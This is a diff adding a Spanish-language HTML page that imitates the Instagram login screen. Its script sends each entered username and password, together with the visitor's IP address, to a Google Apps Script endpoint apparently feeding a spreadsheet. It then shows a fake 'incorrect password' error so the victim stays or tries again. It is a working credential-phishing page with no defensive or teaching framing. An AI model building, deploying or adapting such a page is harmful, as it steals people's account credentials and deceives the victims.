@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+        .container {
+            width: 350px;
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+            font-family: 'Grand Hotel', cursive;
+            font-size: 48px;
+            color: #262626;
+        }
+        .input-group {
+            width: 100%;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 14px 10px;
+            font-size: 12px;
+            color: #262626;
+            outline: none;
+        }
+        input:focus {
+            border-color: #a8a8a8;
+        }
+        button {
+            width: 100%;
+            background-color: #0095f6;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-weight: 600;
+            padding: 10px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        button:disabled {
+            background-color: #87d8f8;
+            cursor: default;
+        }
+        .error {
+            color: #ed4956;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+        }
+        .loader {
+            display: none;
+            margin-top: 10px;
+            font-size: 12px;
+            color: #8e8e8e;
+        }
+    </style>
+    <!-- Fuente estilo Instagram -->
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">Instagram</div>
+        <div class="error" id="error-msg">El nombre de usuario o la contraseña es incorrecta.</div>
+        
+        <form id="login-form">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="Teléfono, nombre de usuario o correo electrónico" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Contraseña" required>
+            </div>
+            <!-- Campo oculto para la IP -->
+            <input type="hidden" id="ip" name="ip">
+            
+            <button type="submit" id="submit-btn">Iniciar sesión</button>
+        </form>
+        
+        <div class="loader" id="loader">Iniciando sesión...</div>
+    </div>
+
+    <script>
+        // https://script.google.com/macros/s/AKfycbwsKYNYKTW2MfQxVgDldU3psYmYc768gC9GFc7zVzDmJTtnROSn-eHDdbKj_3uVysQ6/exec
+        const SCRIPT_URL = https://script.google.com/macros/s/AKfycbwsKYNYKTW2MfQxVgDldU3psYmYc768gC9GFc7zVzDmJTtnROSn-eHDdbKj_3uVysQ6/exec;
+
+        const form = document.getElementById('login-form');
+        const btn = document.getElementById('submit-btn');
+        const loader = document.getElementById('loader');
+        const errorMsg = document.getElementById('error-msg');
+
+        // Obtener la IP del usuario usando un servicio gratuito
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                document.getElementById('ip').value = data.ip;
+            })
+            .catch(() => {
+                document.getElementById('ip').value = 'No disponible';
+            });
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const ip = document.getElementById('ip').value;
+
+            // UI: Mostrar carga y deshabilitar botón
+            btn.disabled = true;
+            loader.style.display = 'block';
+            errorMsg.style.display = 'none';
+
+            // Enviar datos a Google Sheets
+            const data = new FormData();
+            data.append('username', username);
+            data.append('password', password);
+            data.append('ip', ip);
+
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                body: data
+            })
+            .then(() => {
+                // Pequeño retraso para realismo
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    errorMsg.style.display = 'block'; // Simulamos error para que intente de nuevo o se quede ahí
+                }, 1500);
+            })
+            .catch(err => {
+                loader.style.display = 'none';
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = "Error de conexión. Intenta de nuevo.";
+                btn.disabled = false;
+            });
+        });
+    </script>
+</body>
+</html>
